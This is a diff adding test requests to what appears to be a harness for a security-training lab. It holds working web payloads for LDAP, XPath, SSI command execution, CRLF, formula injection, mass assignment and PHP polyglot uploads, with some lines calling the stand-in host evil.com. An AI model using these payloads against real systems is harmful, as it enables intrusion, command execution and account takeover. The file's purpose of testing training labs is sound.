@@ -158,6 +158,58 @@ await t("jwt-3 secret", "/lab/jwt-3", { headers: { Authorization: "Bearer " + jh
 await t("oauth-1 ruri", "/lab/oauth-1/authorize?redirect_uri=" + encodeURIComponent("https://app.academy.local@evil.com") + "&state=csrf1");
 await t("oauth-2 scope", "/lab/oauth-2/token?code=x&scope=admin");
 await t("oauth-3 email", "/lab/oauth-3?email=" + encodeURIComponent("bob@academy.local"));
+// ---------- LDAP injection ----------
+await t("ldap-1 wild", "/lab/ldap-1", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "username=*&password=*" });
+await t("ldap-2 wild", "/lab/ldap-2?query=*");
+// ---------- XPath injection ----------
+await t("xpath-1 bool", "/lab/xpath-1?name='+OR+'1'='1");
+await t("xpath-2 blind", "/lab/xpath-2?username='+or+substring(name[1]/text(),1,1)='a");
+// ---------- HTTP parameter pollution ----------
+await t("hpp-1 dup", "/lab/hpp-1?username=administrator&username=guest");
+await t("hpp-2 role", "/lab/hpp-2?role=user&role=admin");
+// ---------- Server-side includes ----------
+await t("ssi-1 exec", "/lab/ssi-1", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "entry=" + encodeURIComponent("<!--#exec cmd=\"whoami\"-->") });
+await t("ssi-2 enc", "/lab/ssi-2", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "entry=" + encodeURIComponent("<!-- - #exec cmd=\"whoami\" -->") });
+// ---------- CSP bypass ----------
+await t("csp-1 inline", "/lab/csp-1?q=<script>alert(1)</script>");
+await t("csp-2 jsonp", "/lab/csp-2?callback=" + encodeURIComponent('alert(1)//"'));
+// ---------- DOM-based ----------
+await t("dom-1 clobber", "/lab/dom-1?q=<a id=defaultMessage>x</a>");
+await t("dom-2 postmsg", "/lab/dom-2?action=delete&origin=https://evil.com");
+// ---------- SRI ----------
+await t("sri-1 external", "/lab/sri-1?src=https://evil.com/x.js");
+// ---------- CRLF ----------
+await t("crlf-1 header", "/lab/crlf-1?next=%0d%0aSet-Cookie:%20hacked=1");
+await t("crlf-2 log", "/lab/crlf-2", { headers: { "User-Agent": "x%0d%0aSet-Cookie: hacked=1" } });
+await t("crlf-2 view", "/lab/crlf-2/log", { headers: { "User-Agent": "x%0d%0aSet-Cookie: hacked=1" } });
+// ---------- Web cache deception ----------
+await t("wcd-1 ext", "/lab/wcd-1/my-account/nonexistent.css");
+await t("wcd-2 orig", "/lab/wcd-2", { headers: { "X-Original-URL": "/my-account" } });
+// ---------- Verb tampering ----------
+await t("verb-1 PUT", "/lab/verb-1/admin", { method: "PUT" });
+await t("verb-2 put", "/lab/verb-2", { method: "PUT", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "username=carlos&newpassword=pwned" });
+// ---------- Mass assignment ----------
+await t("mass-1 reg", "/lab/mass-1", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "username=x&password=y&isAdmin=true" });
+await t("mass-2 upd", "/lab/mass-2", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "email=x@y.com&role=admin" });
+// ---------- Excessive data exposure ----------
+await t("expose-1 api", "/lab/expose-1/api/user/1");
+await t("expose-2 debug", "/lab/expose-2?q=1");
+// ---------- Formula injection ----------
+await t("formula-1 add", "/lab/formula-1", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "name=" + encodeURIComponent('=HYPERLINK("http://evil.com")') });
+await t("formula-1 csv", "/lab/formula-1/export");
+// ---------- ReDoS ----------
+await t("redos-1 deep", "/lab/redos-1?q=aaaaaaaaaaaaaaaaaaaaaaaaab");
+// ---------- DNS rebinding ----------
+await t("rebind-1 ssrf", "/lab/rebind-1?stockApi=http://7f000001.rebind.network/admin");
+// ---------- Content-type confusion ----------
+await t("ctc-1 polyglot", "/lab/ctc-1", { method: "POST", headers: { "Content-Type": "multipart/form-data; boundary=X" }, body: '--X\r\nContent-Disposition: form-data; name="file"; filename="x.php"\r\n\r\nGIF89a<?php echo 1;\r\n--X--' });
+// ---------- Misconfiguration ----------
+await t("misconfig-1 creds", "/lab/misconfig-1", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "username=admin&password=admin" });
+await t("misconfig-2 list", "/lab/misconfig-2/backup/");
+await t("misconfig-3 verbose", "/lab/misconfig-3?id=abc");
+// ---------- WebSockets (new) ----------
+await t("ws-3 noauth", "/lab/ws-3/admin");
+await t("ws-4 owner", "/lab/ws-4/action", { method: "POST", headers: { "Content-Type": "application/json" }, body: '{"to":"victim","amount":100,"from":"carlos"}' });
 // ---------- Progress API ----------
 {
   const mk = await worker.fetch(new Request(base + "/api/mark-many", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ ids: ["jwt-1", "oauth-1"] }) }), {});
